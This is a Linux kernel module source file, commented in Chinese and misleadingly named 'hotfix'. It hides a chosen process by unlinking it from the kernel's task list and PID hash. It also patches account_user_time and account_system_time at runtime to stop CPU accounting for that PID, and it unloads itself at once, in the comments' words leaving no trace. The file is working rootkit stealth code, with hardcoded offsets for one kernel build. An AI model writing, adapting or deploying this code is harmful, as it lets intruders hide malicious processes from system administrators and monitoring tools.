// hide_process.c
#include <linux/module.h>
#include <linux/kallsyms.h>
#include <linux/sched.h>
#include <linux/sched.h>
#include <linux/cpu.h>

char *stub = NULL;
char *addr_user = NULL;
char *addr_sys = NULL;
unsigned long *percpuoff = NULL;

static unsigned int pid = 0;
module_param(pid, int, 0444);

static unsigned int hide = 1;
module_param(hide, int, 0444);

// stub函数模版
void stub_func_template(struct task_struct *p, u64 cputime, u64 cputime_scaled)
{
	// 先用0x11223344来占位，模块加载的时候通过pid参数来校准
	if (p->pid == 0x11223344)  {
		asm ("pop %rbp; pop %r11; retq;");
	}
}

#define FTRACE_SIZE   	5
#define POKE_OFFSET		0
#define POKE_LENGTH		5

#define RQUEUE_SIZE		2680
#define TASKS_OFFSET	2344
#define CPU_OFFSET		2336

void * *(*___vmalloc_node_range)(unsigned long size, unsigned long align,
            unsigned long start, unsigned long end, gfp_t gfp_mask,
            pgprot_t prot, int node, const void *caller);
static void *(*_text_poke_smp)(void *addr, const void *opcode, size_t len);
static struct mutex *_text_mutex;

// 需要额外分配的stub函数
char *hide_account_user_time = NULL;

void hide_process(void)
{
	struct task_struct *task = NULL;
	struct pid_link *link = NULL;

	struct hlist_node *node = NULL;
	task = pid_task(find_vpid(pid), PIDTYPE_PID);
	link = &task->pids[PIDTYPE_PID];

	list_del_rcu(&task->tasks);
	INIT_LIST_HEAD(&task->tasks);
	node = &link->node;
	hlist_del_rcu(node);
	INIT_HLIST_NODE(node);
	node->pprev = &node;
}

#define CRQ_OFFSET	160
void reshow_process(void)
{
	struct list_head *list;
	struct task_struct *p, *n;
	unsigned long *rq_addr, base_rq;
	char *tmp;
	int cpu = smp_processor_id();
	struct task_struct *task = current;//pid_task(find_vpid(1), PIDTYPE_PID);
	struct pid_link *link = NULL;

	// 以下一直到for语句为惯常的percpu变量定位操作。
	tmp = (char *)task->se.cfs_rq;;

	rq_addr = (unsigned long *)(tmp + CRQ_OFFSET);
	tmp = (char *)*rq_addr;

	cpu = (int)*(int *)(tmp + CPU_OFFSET);
	base_rq = (unsigned long)tmp - (unsigned long)percpuoff[cpu];

	task = NULL;

	for_each_possible_cpu(cpu) { // 找到被隐藏的进程
		tmp = (char *)(percpuoff[cpu] + base_rq);
		list = (struct list_head *)&tmp[TASKS_OFFSET];
		list_for_each_entry_safe(p, n, list, se.group_node) {
			if (list_empty(&p->tasks)) {
				task = p;
				break;
			}
		}
		if (task) break;
	}

	if (!task) return;

	link = &task->pids[PIDTYPE_PID];

	hlist_add_head_rcu(&link->node, &link->pid->tasks[PIDTYPE_PID]);
	list_add_tail_rcu(&task->tasks, &init_task.tasks);

}

static int __init hotfix_init(void)
{
	unsigned char jmp_call[POKE_LENGTH];
	// 32位相对跳转偏移
	s32 offset;
	// 需要校准的pid指针位置。
	unsigned int *ppid;


	addr_user = (void *)kallsyms_lookup_name("account_user_time");
	addr_sys = (void *)kallsyms_lookup_name("account_system_time");
	if (!addr_user || !addr_sys) {
		printk("一切还没有准备好！请先加载sample模块。\n");
		return -1;
	}

	// 必须采用带range的内存分配函数，否则我们无法保证account_user_time可以32位相对跳转过来！
	___vmalloc_node_range = (void *)kallsyms_lookup_name("__vmalloc_node_range");
	_text_poke_smp = (void *)kallsyms_lookup_name("text_poke_smp");
	_text_mutex = (void *)kallsyms_lookup_name("text_mutex");
	if (!___vmalloc_node_range || !_text_poke_smp || !_text_mutex) {
		printk("还没开始，就已经结束。");
		return -1;
	}

	if (hide == 0) { // 进程的恢复操作
		offset = *(unsigned int *)&addr_user[1];
		stub = (char *)(offset + (unsigned long)addr_user + FTRACE_SIZE);

		// 恢复hook函数
		get_online_cpus();
		mutex_lock(_text_mutex);
		_text_poke_smp(&addr_user[POKE_OFFSET], &stub[0], POKE_LENGTH);
		_text_poke_smp(&addr_sys[POKE_OFFSET], &stub[0], POKE_LENGTH);
		mutex_unlock(_text_mutex);
		put_online_cpus();

		vfree(stub);

		percpuoff = (void *)kallsyms_lookup_name("__per_cpu_offset");
		if (!percpuoff)
			return -1;
		reshow_process();
		return -1;
	}

#define START _AC(0xffffffffa0000000, UL)
#define END   _AC(0xffffffffff000000, UL)
	// 为了可以在32位范围内相对跳转，必须在START后分配stub func内存
	hide_account_user_time = (void *)___vmalloc_node_range(128, 1, START, END,
								GFP_KERNEL | __GFP_HIGHMEM, PAGE_KERNEL_EXEC,
								-1, __builtin_return_address(0));
	if (!hide_account_user_time) {
		printk("很遗憾，内存不够了\n");
		return -1;
	}

	// 把模版函数拷贝到真正的stub函数中
	memcpy(hide_account_user_time, stub_func_template, 0x25);
	// 校准pid立即数
	ppid = (unsigned int *)&hide_account_user_time[12];
	// 使用立即数来比较pid，不然模块释放掉以后pid参数将不再可读
	*ppid = pid;

	stub = (void *)hide_account_user_time;

	jmp_call[0] = 0xe8;

	offset = (s32)((long)stub - (long)addr_user - FTRACE_SIZE);
	(*(s32 *)(&jmp_call[1])) = offset;

	get_online_cpus();
	mutex_lock(_text_mutex);
	_text_poke_smp(&addr_user[POKE_OFFSET], jmp_call, POKE_LENGTH);
	mutex_unlock(_text_mutex);
	put_online_cpus();

	offset = (s32)((long)stub - (long)addr_sys - FTRACE_SIZE);
	(*(s32 *)(&jmp_call[1])) = offset;

	get_online_cpus();
	mutex_lock(_text_mutex);
	_text_poke_smp(&addr_sys[POKE_OFFSET], jmp_call, POKE_LENGTH);
	mutex_unlock(_text_mutex);
	put_online_cpus();

	// 隐藏进程，将其从数据结构中摘除
	hide_process();

	// 事了拂衣去，不留痕迹
	return -1;
}

static void __exit hotfix_exit(void)
{
	// 事了拂衣去了，什么都没有留下，也不必再过问！
}

module_init(hotfix_init);
module_exit(hotfix_exit);
MODULE_LICENSE("GPL");
